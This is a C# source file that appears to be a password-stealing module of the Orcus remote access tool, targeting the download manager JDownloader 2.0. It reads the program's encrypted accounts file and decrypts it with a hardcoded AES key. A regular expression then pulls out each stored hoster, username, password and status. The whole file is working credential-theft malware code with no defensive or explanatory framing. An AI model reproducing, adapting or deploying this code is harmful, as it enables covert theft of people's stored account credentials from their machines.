using System;
using System.Collections.Generic;
using System.IO;
using System.Linq;
using System.Security.Cryptography;
using System.Text.RegularExpressions;
using Orcus.Shared.Commands.Password;

namespace Orcus.Commands.Passwords.Applications.JDownloader
{
    internal class JDownloader : IPasswordRecovery
    {
        public IEnumerable<RecoveredPassword> GetPasswords()
        {
            var accountPath = Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.LocalApplicationData),
                @"JDownloader v2.0\cfg\org.jdownloader.settings.AccountSettings.accounts.ejs");

            var result = new List<RecoveredPassword>();

            if (!File.Exists(accountPath))
                return result;

            var data = Decrypt(accountPath);
            foreach (
                Match match in
                    Regex.Matches(data,
                        @"""(?<hoster>(.+?))"" : \[\ \{.+?""password"" : ""(?<password>(.*?))"".*?""user"" : ""(?<userName>(.*?))"".*?""statusString"" : ""(?<status>(.*?))""",
                        RegexOptions.Singleline)) //""validUntil"" : (?<validUntil>([0-9]*)).*?
            {
                result.Add(new RecoveredPassword
                {
                    Application = "JDownloader 2.0",
                    UserName = match.Groups["userName"].Value,
                    Password = match.Groups["password"].Value,
                    Field1 = match.Groups["hoster"].Value,
                    Field2 = match.Groups["status"].Value,
                    PasswordType = PasswordType.Other
                });
            }

            return result;
        }

        private static string Decrypt(string filePath)
        {
            byte[] data = File.ReadAllBytes(filePath);
            sbyte[] skey = {1, 6, 4, 5, 2, 7, 4, 3, 12, 61, 14, 75, -2, -7, -44, 33};
            byte[] key = skey.Select(sb => unchecked((byte) sb)).ToArray();
            using (AesCryptoServiceProvider acs = new AesCryptoServiceProvider())
            {
                acs.Key = key;
                acs.IV = key;
                ICryptoTransform decryptor = acs.CreateDecryptor(acs.Key, acs.IV);
                using (MemoryStream msDecrypt = new MemoryStream(data))
                using (CryptoStream csDecrypt = new CryptoStream(msDecrypt, decryptor, CryptoStreamMode.Read))
                using (StreamReader srDecrypt = new StreamReader(csDecrypt))
                    return srDecrypt.ReadToEnd();
            }
        }
    }
}